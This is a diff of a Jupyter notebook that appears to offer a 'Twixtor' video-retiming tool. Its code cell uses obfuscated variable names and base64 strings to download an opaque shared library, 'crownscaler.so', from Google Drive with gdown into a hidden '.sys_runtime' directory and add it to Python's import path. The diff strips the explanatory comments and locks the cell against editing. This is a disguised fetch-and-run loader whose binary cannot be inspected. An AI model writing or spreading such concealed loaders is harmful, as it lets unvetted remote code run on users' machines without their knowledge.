@@ -1,15 +1,6 @@
 {
   "cells": [
     {
-      "cell_type": "markdown",
-      "source": [
-        "NOW MAKE YOUR OWN TWIXTORS"
-      ],
-      "metadata": {
-        "id": "kOiXxno-v6dk"
-      }
-    },
-    {
       "cell_type": "code",
       "source": [
         "\n",
@@ -19,17 +10,13 @@
         "\n",
         "_0x70 = _0x3c.b64decode(b'L3Vzci9sb2NhbC9zaGFyZS8uY29uZmlnLy5zeXNfcnVudGltZQ==').decode()\n",
         "_0x81 = f\"{_0x70}/{_0x3c.b64decode(b'Y3Jvd25zY2FsZXIuc28=').decode()}\"\n",
-        "\n",
-        "# Your Google Drive ID (Base64 encoded)\n",
         "_0xdrive_id_b64 = b'MXNOUGFiN3h1dEpFREpRUDYwUG1zbjJoOUpoTE04Y0dl'\n",
         "_0xfile_id = _0x3c.b64decode(_0xdrive_id_b64).decode()\n",
         "\n",
-        "# Clean up corrupted/0-byte file if previously failed\n",
         "if not _0x1a.path.exists(_0x81) or _0x1a.path.getsize(_0x81) < 1024:\n",
         "    _0x1a.makedirs(_0x70, exist_ok=True)\n",
         "    if _0x1a.path.exists(_0x81):\n",
         "        _0x1a.remove(_0x81)\n",
-        "    # Download directly using gdown with fuzzy matching to avoid Google Drive confirmation page\n",
         "    _0x1a.system(f\"gdown --id {_0xfile_id} -O {_0x81} --fuzzy\")\n",
         "\n",
         "if _0x70 not in _0x2b.path:\n",
@@ -46,10 +33,21 @@
       ],
       "metadata": {
         "cellView": "form",
-        "id": "3CKu1P_J-765"
+        "id": "3CKu1P_J-765",
+        "editable": false
       },
       "execution_count": null,
       "outputs": []
+    },
+    {
+      "cell_type": "markdown",
+      "source": [
+        "**UPDATES**\n",
+        "* Now Make Twixtors"
+      ],
+      "metadata": {
+        "id": "1hSmQHWAGwDZ"
+      }
     }
   ],
   "metadata": {
